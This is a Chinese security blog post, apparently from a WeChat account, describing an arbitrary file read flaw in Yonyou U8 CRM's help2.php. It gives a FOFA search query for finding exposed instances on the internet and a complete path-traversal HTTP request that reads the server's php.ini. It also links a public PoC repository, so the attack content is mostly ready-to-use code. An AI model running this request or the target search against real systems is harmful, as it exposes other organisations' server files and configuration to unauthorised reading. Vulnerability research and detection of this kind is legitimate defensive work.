#  用友U8 CRM系统help2 任意文件读取漏洞   
原创 安全透视镜  网络安全透视镜   2023-12-20 07:00  
  
# 一、漏洞描述  
  
  
用友U8+经过20多年的市场锤炼，不断贴近客户需求，以全新UAP为平台，应对中型及成长型企业客户群的发展，提供的是一整套企业级数智化升级解决方案，为成长型企业构建精细管理、产业链协同、社交化运营为一体的企业互联网经营管理平台，助力企业应势而变。g该系统help2文件中接口存在任意文件读取漏洞，  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/apNprpz3YS5hv6iasEz89gxRooKMybKtBvIFDD4UI4zLazJUbFMCRNxI6rWN1IlPPbmxtMBmw1AxGJmL3avBfbw/640?wx_fmt=png&from=appmsg "")  
  
# 二、网络空间搜索引擎搜索  
  
  
fofa查询  
```
title="用友U8CRM"
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/apNprpz3YS5hv6iasEz89gxRooKMybKtBuO497iaJib7cEicQY5gEX2UuqqXa690mSyeibFekoDMnThTYkwV40VA4yg/640?wx_fmt=png&from=appmsg "")  
  
# 三、漏洞复现  
  
  
POC  
```
GET /pub/help2.php?key=/../../apache/php.ini HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/apNprpz3YS5hv6iasEz89gxRooKMybKtBHwojGFo0IPKkHZm516XyfPD3RoXOU79Bh1uam74xmqribKw9KT7pSEg/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/apNprpz3YS5hv6iasEz89gxRooKMybKtB7Dlia6b8gCeCKKekkS2MW65FGh2lfcKuypDULUg565gssiavWDv8NJUw/640?wx_fmt=png&from=appmsg "")  
  
# 四、漏洞检测  
  
  
pocsuite3漏洞检测  
  
![](https://mmbiz.qpic.cn/mmbiz_png/apNprpz3YS5hv6iasEz89gxRooKMybKtB3gEsh5pQp0sIaDGb7MLSrfEhwa5j3OyDxibOAKdIXp8V0PTlzOiass2w/640?wx_fmt=png&from=appmsg "")  
  
漏洞检测脚本已上传免费漏洞库  
  
地址：  
  
https://github.com/Vme18000yuan/FreePOC  
  
# 免责声明：文章来源互联网收集整理，请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
****  
![](https://mmbiz.qpic.cn/mmbiz_png/apNprpz3YS4ibIBPcmgJMLNXWIaCPcW54mVicYJkaOO1JQicEDBGCBM1P7IiaiablZ9tEUrP27FyvB9CZWl5SiaqhicDw/640?wx_fmt=png "")  
  
  
